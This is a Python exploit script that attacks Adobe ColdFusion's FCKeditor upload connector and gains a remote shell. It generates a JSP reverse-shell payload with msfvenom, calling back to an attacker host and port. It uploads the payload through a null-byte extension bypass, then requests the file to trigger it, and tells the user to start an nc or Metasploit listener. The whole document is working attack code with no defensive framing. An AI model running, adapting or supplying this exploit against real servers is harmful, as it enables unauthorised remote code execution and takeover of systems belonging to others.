#!/usr/bin/python3

import requests
import sys
import random
import string
from bs4 import BeautifulSoup
import subprocess
import os 

def make_shell(lhost,lport):
	print("[+] Creating JSP Shell")
	letters = string.ascii_lowercase+string.ascii_uppercase
	file_name = ''.join(random.choice(letters) for i in range(6,21))
	msfvenom_string = "msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f raw -o {}.jsp".format(lhost,lport,file_name)
	p = subprocess.Popen(msfvenom_string.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out,err = p.communicate()
	if "Error" in err.decode():
		print("[-] Could Not Create Payload")
		exit()
	print("[+] Payload Created Successfully")
	return file_name

def make_request(rhost,rport,file_name):
	letters = string.ascii_lowercase+string.ascii_uppercase
	cur_folder_name = ''.join(random.choice(letters) for i in range(6,11))
	url = "http://{}:{}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{}.jsp%00".format(rhost,rport,cur_folder_name)
	files = {"newfile":(file_name+".txt",open('{}.jsp'.format(file_name),'rb'),"application/x-java-archive")}
	headers={"User-Agent":"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"}
	#proxy = {"http":"http://127.0.0.1:8080"}
	print("[+] Sending Post Request Containing Our Payload")
	r = requests.post(url,headers=headers,files=files)#,proxies=proxy)
	text = r.text
	soup = BeautifulSoup(text,'html.parser')
	output = soup.find("script").text.strip()
	if "OnUploadCompleted" not in output:
		print("[-] Exploit Failed")
		exit()
	print("[+] Post Request Successful, Popping Shell")
	print("[+] Shell uploaded to <rhost>:<rport>/userfiles/file/{}.jsp".format(cur_folder_name))
	return cur_folder_name

def cleanup(file_name):
	os.system("/usr/bin/rm {}.jsp".format(file_name))

def pop_shell(rhost,rport,shell_file_name):
	url = "http://{}:{}/userfiles/file/{}.jsp".format(rhost,rport,shell_file_name)
	r = requests.get(url)
	
def main():
	usage = "USAGE: {} <rhost> <rport> <lhost> <lport>".format(sys.argv[0])
	if len(sys.argv) < 5:
		print(usage)
		exit()
	print("[*] Start Your Listener\n\nnc -lvnp <lport>\n\nor use metasploit exploit/multi/handler\npayload = java/jsp_shell_reverse_tcp",end="\n\n")
	rhost = sys.argv[1]
	rport = sys.argv[2]
	lhost = sys.argv[3]
	lport = sys.argv[4]
	
	file_name = make_shell(lhost,lport)
	shell_file_name = make_request(rhost,rport,file_name)
	cleanup(file_name)
	pop_shell(rhost,rport,shell_file_name)
	

if __name__ == "__main__":
	main()
	
